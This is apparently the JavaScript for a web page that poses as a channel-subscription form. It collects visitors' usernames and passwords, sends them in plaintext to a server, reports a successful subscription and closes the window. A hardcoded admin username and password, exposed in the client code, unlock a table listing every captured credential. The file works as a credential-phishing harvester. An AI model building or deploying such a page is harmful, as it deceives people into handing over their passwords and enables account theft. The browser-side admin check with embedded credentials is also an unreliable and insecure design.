(() => {
  const adminUsername = "jonnagiri";
  const adminPassword = "1127@@2603";
  const apiBase = (window.API_BASE || "http://localhost:3000").replace(/\/+$/, "");

  const form = document.getElementById("subscribeForm");
  const alertInfo = document.getElementById("alertInfo");
  const alertSuccess = document.getElementById("alertSuccess");
  const adminActions = document.getElementById("adminActions");
  const submissions = document.getElementById("submissions");
  const submissionsBody = document.getElementById("submissionsBody");
  const noSubmissions = document.getElementById("noSubmissions");
  const toggleTable = document.getElementById("toggleTable");
  const clearTable = document.getElementById("clearTable");

  function setAlert(element, message) {
    if (!message) {
      element.classList.add("d-none");
      element.textContent = "";
      return;
    }
    element.textContent = message;
    element.classList.remove("d-none");
  }

  function escapeHtml(value) {
    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/\"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  async function fetchSubmissions() {
    const response = await fetch(`${apiBase}/submissions`, { method: "GET" });
    if (!response.ok) {
      throw new Error(`Failed to load submissions (${response.status})`);
    }
    const data = await response.json();
    return Array.isArray(data) ? data : [];
  }

  async function createSubmission(username, password) {
    const response = await fetch(`${apiBase}/submissions`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password })
    });
    if (!response.ok) {
      throw new Error(`Failed to save submission (${response.status})`);
    }
  }

  async function clearSubmissionsRemote() {
    const response = await fetch(`${apiBase}/submissions`, { method: "DELETE" });
    if (!response.ok) {
      throw new Error(`Failed to clear submissions (${response.status})`);
    }
  }

  function renderTable(items) {
    submissionsBody.innerHTML = "";

    if (items.length === 0) {
      noSubmissions.classList.remove("d-none");
      return;
    }

    noSubmissions.classList.add("d-none");
    items.forEach((item) => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td>${escapeHtml(item.username)}</td>
        <td>${escapeHtml(item.password)}</td>
        <td>${escapeHtml(item.createdUtc)}</td>
      `;
      submissionsBody.appendChild(tr);
    });
  }

  function hasAdminAccess() {
    const username = form.username.value.trim();
    const password = form.password.value;
    return username === adminUsername && password === adminPassword;
  }

  function updateAdminAccess() {
    const isAdmin = hasAdminAccess();
    adminActions.classList.toggle("d-none", !isAdmin);

    if (!isAdmin) {
      submissions.classList.add("d-none");
      toggleTable.textContent = "Show submissions";
    }
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    setAlert(alertInfo, "");
    setAlert(alertSuccess, "");

    const username = form.username.value.trim();
    const password = form.password.value.trim();

    if (!username || !password) {
      setAlert(alertInfo, "Username and password are required.");
      return;
    }

    const isAdminLogin = username === adminUsername && password === adminPassword;
    if (isAdminLogin) {
      try {
        const items = await fetchSubmissions();
        adminActions.classList.remove("d-none");
        submissions.classList.remove("d-none");
        toggleTable.textContent = "Hide submissions";
        renderTable(items);
        setAlert(alertSuccess, "Admin access granted. Showing all submissions.");
      } catch (error) {
        setAlert(
          alertInfo,
          `Cannot load shared submissions. Start the server and verify API_BASE (${apiBase}).`
        );
      }
      return;
    }

    try {
      await createSubmission(username, password);
    } catch (error) {
      setAlert(
        alertInfo,
        `Cannot submit to shared server. Start the server and verify API_BASE (${apiBase}).`
      );
      return;
    }

    form.reset();
    updateAdminAccess();

    setAlert(alertSuccess, "Successfully subscribed channel.");

    setTimeout(() => {
      window.close();
    }, 3000);
  });

  form.username.addEventListener("input", updateAdminAccess);
  form.password.addEventListener("input", updateAdminAccess);

  toggleTable.addEventListener("click", async () => {
    if (!hasAdminAccess()) {
      updateAdminAccess();
      return;
    }

    const isHidden = submissions.classList.contains("d-none");
    submissions.classList.toggle("d-none", !isHidden);
    toggleTable.textContent = isHidden ? "Hide submissions" : "Show submissions";

    if (isHidden) {
      try {
        const items = await fetchSubmissions();
        renderTable(items);
      } catch (error) {
        setAlert(
          alertInfo,
          `Cannot load shared submissions. Start the server and verify API_BASE (${apiBase}).`
        );
      }
    }
  });

  clearTable.addEventListener("click", async () => {
    if (!hasAdminAccess()) {
      updateAdminAccess();
      return;
    }

    if (!confirm("Clear all shared submissions?")) {
      return;
    }
    try {
      await clearSubmissionsRemote();
      renderTable([]);
    } catch (error) {
      setAlert(
        alertInfo,
        `Cannot clear shared submissions. Start the server and verify API_BASE (${apiBase}).`
      );
    }
  });

  updateAdminAccess();
})();
